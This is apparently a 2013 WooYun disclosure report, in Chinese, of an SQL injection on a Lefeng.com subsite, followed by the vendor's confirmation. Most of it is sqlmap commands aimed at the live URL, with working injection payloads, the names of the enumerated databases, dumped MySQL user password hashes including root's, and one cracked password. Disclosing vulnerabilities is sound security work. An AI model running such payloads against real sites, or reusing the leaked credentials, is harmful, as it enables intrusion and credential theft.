wybug_title: 乐蜂网分站SQL注入貌似ROOT权限可脱裤
wybug_detail:
漏洞详情 披露状态：   									2013-03-04：	细节已通知厂商并且等待厂商处理中									2013-03-04：	厂商已经确认，细节仅向厂商公开									2013-03-14：	细节向核心白帽子及相关领域专家公开									2013-03-24：	细节向普通白帽子公开									2013-04-03：	细节向实习白帽子公开									2013-04-18：	细节向公众公开  简要描述： 乐蜂网分站SQL注入 貌似ROOT权限 不说废话了 求礼物！ 详细说明：  
E:\教程\sqlmap>C:\Python27\python E:\教程\sqlmap\sqlmap\sqlmap.py -u "http://f.lefeng.com/pk/index?year=2013" --dbs --threads 1Place: GETParameter: yearType: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE or HAVING clausePayload: year=2013' AND (SELECT 8276 FROM(SELECT COUNT(*),CONCAT(0x3a726b6c3a,(SELECT (CASE WHEN (8276=8276) THEN 1 ELSE 0 END)),0x3a6362743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'WGVp'='WGVpType: stacked queriesTitle: MySQL > 5.0.11 stacked queriesPayload: year=2013'; SELECT SLEEP(5)-----[09:15:09] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.6back-end DBMS: MySQL 5.0[09:15:09] [INFO] fetching database names[09:15:09] [INFO] the SQL query used returns 8 entries[09:15:09] [INFO] retrieved: information_schema[09:15:10] [INFO] retrieved: cacti_nagios[09:15:10] [INFO] retrieved: fengxiangbiao[09:15:10] [INFO] retrieved: lefeng_talent[09:15:10] [INFO] retrieved: lefeng_wenda[09:15:11] [INFO] retrieved: mysql[09:15:11] [INFO] retrieved: performance_schema[09:15:11] [INFO] retrieved: testavailable databases [8]:[*] cacti_nagios[*] fengxiangbiao[*] information_schema[*] lefeng_talent[*] lefeng_wenda[*] mysql[*] performance_schema[*] test
   漏洞证明：  


E:\教程\sqlmap>C:\Python27\python E:\教程\sqlmap\sqlmap\sqlmap.py -u "http://f.lefeng.com/pk/index?year=2013" --passwords --threads 3    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:06:28[10:06:28] [INFO] resuming back-end DBMS 'mysql'[10:06:28] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: year    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: year=2013' AND (SELECT 8276 FROM(SELECT COUNT(*),CONCAT(0x3a726b6c3a,(SELECT (CASE WHEN (8276=8276) THEN 1 ELSE 0 END)),0x3a6362743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'WGVp'='WGVp    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: year=2013'; SELECT SLEEP(5)-----[10:06:28] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.6back-end DBMS: MySQL 5.0[10:06:28] [INFO] fetching database users password hashes[10:06:28] [INFO] the SQL query used returns 5 entries[10:06:28] [INFO] starting 3 threads[10:06:28] [INFO] resumed: cacti[10:06:28] [INFO] resumed: dffxmysql[10:06:28] [INFO] resumed: *42FD27C36FBAA374F5867999859C3BE8881D3D2C[10:06:28] [INFO] resumed: repl[10:06:28] [INFO] resumed: *F999CB25F51B2AC5C23406C5E7C0DB40263860FD[10:06:28] [INFO] resumed: cactiuser[10:06:28] [INFO] resumed: *7FFCE8197A942D8796B6E0EE7A479170664C18F5[10:06:28] [INFO] resumed: root[10:06:28] [INFO] resumed: *23BD454A1686EBC712067202292C1CD7AD6A0E81[10:06:28] [INFO] resumed: *A424E797037BF97C19A2E88CF7891C5C2038C039do you want to perform a dictionary-based attack against retrieved password hashes? All unhandled occurances will result in replacement with '?' character. (slow!) [y/N][10:06:34] [INFO] starting dictionary-based cracking (mysql_passwd)[10:06:34] [INFO] starting 4 processes[10:06:48] [INFO] writing uncracked hashes to file 'c:\users\admini~1.rj4\appdata\local\temp\tmptw8ybg.txt' for eventual further processingdatabase management system users password hashes:[*] cacti [1]:    password hash: *42FD27C36FBAA374F5867999859C3BE8881D3D2C[*] cactiuser [1]:    password hash: *23BD454A1686EBC712067202292C1CD7AD6A0E81[*] dffxmysql [1]:    password hash: *F999CB25F51B2AC5C23406C5E7C0DB40263860FD[*] repl [1]:    password hash: *7FFCE8197A942D8796B6E0EE7A479170664C18F5[*] root [1]:    password hash: *A424E797037BF97C19A2E88CF7891C5C2038C039    clear-text password: repl

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-03-04 11:18 厂商回复： 没有重要数据，我们将尽快修复，礼物随后将寄出，谢谢！！ 最新状态： 暂无
